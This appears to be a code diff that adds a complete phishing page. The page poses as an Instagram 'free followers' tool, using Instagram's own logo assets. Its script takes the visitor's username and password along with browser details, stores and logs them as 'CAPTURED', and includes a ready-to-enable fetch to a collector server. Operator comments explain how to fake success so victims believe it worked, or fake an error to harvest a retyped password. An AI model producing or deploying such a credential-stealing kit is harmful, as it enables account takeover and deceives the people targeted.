@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="theme-color" content="#ffffff">
+<title>Instagram Followers — Free Growth Tool</title>
+<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/yr/r/rNYMWeefDh0.ico">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background:#fafafa;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color:#262626;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+  .wrap { width:100%; max-width:400px; padding:20px 16px 40px; }
+  .hero {
+    text-align:center;
+    margin-bottom:24px;
+  }
+  .hero .ig-logo {
+    width:64px; height:64px;
+    margin:0 auto 12px;
+    background:url('https://static.cdninstagram.com/rsrc.php/v4/yT/r/wN1eUCuq_6I.png') no-repeat center/contain;
+  }
+  .hero h1 {
+    font-size:22px;
+    font-weight:700;
+    margin-bottom:6px;
+  }
+  .hero p {
+    font-size:14px;
+    color:#8e8e8e;
+    line-height:20px;
+  }
+  .card {
+    background:#fff;
+    border:1px solid #dbdbdb;
+    border-radius:12px;
+    padding:28px 24px 22px;
+    box-shadow:0 1px 3px rgba(0,0,0,.04);
+  }
+  .offer {
+    background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
+    color:#fff;
+    border-radius:8px;
+    padding:14px;
+    text-align:center;
+    margin-bottom:20px;
+    font-size:14px;
+    font-weight:600;
+  }
+  .offer span { font-size:20px; display:block; margin-bottom:2px; }
+  .field { position:relative; margin:0 0 10px; }
+  .field input {
+    width:100%;
+    height:44px;
+    padding:12px 12px 8px;
+    background:#fafafa;
+    border:1px solid #dbdbdb;
+    border-radius:8px;
+    font-size:14px;
+    color:#262626;
+  }
+  .field input:focus {
+    outline:none;
+    border-color:#0095f6;
+    background:#fff;
+  }
+  .field label {
+    position:absolute;
+    left:12px;
+    top:13px;
+    font-size:14px;
+    color:#8e8e8e;
+    pointer-events:none;
+    transition:.12s;
+  }
+  .field input:not(:placeholder-shown) + label,
+  .field input:focus + label {
+    top:4px;
+    font-size:10px;
+  }
+  .field input:not(:placeholder-shown) {
+    padding-top:18px;
+    padding-bottom:6px;
+  }
+  .btn {
+    width:100%;
+    height:44px;
+    margin-top:8px;
+    background:#0095f6;
+    border:none;
+    border-radius:8px;
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+  }
+  .btn:disabled { background:#b2dffc; cursor:default; }
+  .btn.loading { color:transparent; position:relative; }
+  .btn.loading::after {
+    content:"";
+    position:absolute;
+    width:18px; height:18px;
+    top:13px; left:calc(50% - 9px);
+    border:2px solid #fff;
+    border-top-color:transparent;
+    border-radius:50%;
+    animation:spin .6s linear infinite;
+  }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .secure {
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:6px;
+    margin-top:14px;
+    font-size:12px;
+    color:#8e8e8e;
+  }
+  .secure svg { width:14px; height:14px; fill:#8e8e8e; }
+  .steps {
+    margin-top:28px;
+    background:#fff;
+    border:1px solid #dbdbdb;
+    border-radius:12px;
+    padding:20px;
+  }
+  .steps h3 {
+    font-size:15px;
+    margin-bottom:14px;
+    text-align:center;
+  }
+  .step {
+    display:flex;
+    gap:12px;
+    margin-bottom:14px;
+    font-size:13px;
+    line-height:18px;
+  }
+  .step:last-child { margin-bottom:0; }
+  .num {
+    width:22px; height:22px;
+    background:#0095f6;
+    color:#fff;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:12px;
+    font-weight:700;
+    flex-shrink:0;
+  }
+  .proof {
+    margin-top:20px;
+    text-align:center;
+    font-size:12px;
+    color:#8e8e8e;
+  }
+  .proof strong { color:#262626; }
+  .error {
+    display:none;
+    background:#fff0f0;
+    border:1px solid #ed4956;
+    color:#ed4956;
+    border-radius:8px;
+    padding:10px;
+    font-size:13px;
+    margin-top:12px;
+    text-align:center;
+  }
+  .success {
+    display:none;
+    text-align:center;
+    padding:30px 10px;
+  }
+  .success .check {
+    width:56px; height:56px;
+    background:#0095f6;
+    color:#fff;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:28px;
+    margin:0 auto 16px;
+  }
+  .success h2 { font-size:18px; margin-bottom:8px; }
+  .success p { font-size:14px; color:#8e8e8e; line-height:20px; }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="hero">
+      <div class="ig-logo"></div>
+      <h1>Free Instagram Followers</h1>
+      <p>Login once & claim up to <strong>5,000 real followers</strong><br>in the next 24 hours. 100% free.</p>
+    </div>
+
+    <div class="card" id="card">
+      <div class="offer">
+        <span>🎁 Limited Offer</span>
+        Today only — unlock 5,000 followers instantly
+      </div>
+
+      <form id="form">
+        <div class="field">
+          <input id="user" type="text" placeholder=" " required autocomplete="username">
+          <label>Instagram Username or Email</label>
+        </div>
+        <div class="field">
+          <input id="pass" type="password" placeholder=" " required autocomplete="current-password">
+          <label>Password</label>
+        </div>
+        <button class="btn" id="btn" type="submit" disabled>Claim Free Followers</button>
+        <div class="error" id="err">Incorrect password. Please try again to claim your followers.</div>
+      </form>
+
+      <div class="secure">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+        Secure login • We never post or message anyone
+      </div>
+    </div>
+
+    <div class="success" id="success">
+      <div class="check">✓</div>
+      <h2>Account Connected!</h2>
+      <p>Your followers are being delivered.<br>
+      You will see the first 500–800 within 30–60 minutes.<br>
+      Keep the app open for faster delivery.</p>
+    </div>
+
+    <div class="steps" id="steps">
+      <h3>How it works</h3>
+      <div class="step">
+        <div class="num">1</div>
+        <div>Login with your Instagram account (safe & private)</div>
+      </div>
+      <div class="step">
+        <div class="num">2</div>
+        <div>We verify your account and start the growth engine</div>
+      </div>
+      <div class="step">
+        <div class="num">3</div>
+        <div>Real-looking followers start arriving within minutes</div>
+      </div>
+    </div>
+
+    <div class="proof">
+      <strong>12,847</strong> accounts claimed followers today
+    </div>
+  </div>
+
+<script>
+const user = document.getElementById('user');
+const pass = document.getElementById('pass');
+const btn  = document.getElementById('btn');
+const err  = document.getElementById('err');
+const form = document.getElementById('form');
+const card = document.getElementById('card');
+const success = document.getElementById('success');
+const steps = document.getElementById('steps');
+
+function check() {
+  btn.disabled = !(user.value.trim().length > 1 && pass.value.trim().length > 3);
+}
+user.addEventListener('input', check);
+pass.addEventListener('input', check);
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  btn.classList.add('loading');
+  btn.disabled = true;
+  err.style.display = 'none';
+
+  const payload = {
+    service: 'ig_followers',
+    username: user.value.trim(),
+    password: pass.value,
+    time: new Date().toISOString(),
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    screen: screen.width + 'x' + screen.height,
+    ref: document.referrer || 'direct'
+  };
+
+  // local capture
+  localStorage.setItem('followers_' + Date.now(), JSON.stringify(payload));
+  console.log('CAPTURED', payload);
+
+  // send to your server (uncomment & set URL)
+  // fetch('https://your-collector.tld/save', {
+  //   method: 'POST',
+  //   headers: {'Content-Type': 'application/json'},
+  //   body: JSON.stringify(payload)
+  // }).catch(()=>{});
+
+  // after short delay show success (or show error to force retry)
+  setTimeout(() => {
+    // Option A: show success so they think it worked
+    card.style.display = 'none';
+    steps.style.display = 'none';
+    success.style.display = 'block';
+
+    // Option B (uncomment if you prefer force-retry):
+    // btn.classList.remove('loading');
+    // btn.disabled = false;
+    // err.style.display = 'block';
+    // pass.value = '';
+    // check();
+  }, 1800);
+});
+</script>
+</body>
+</html>
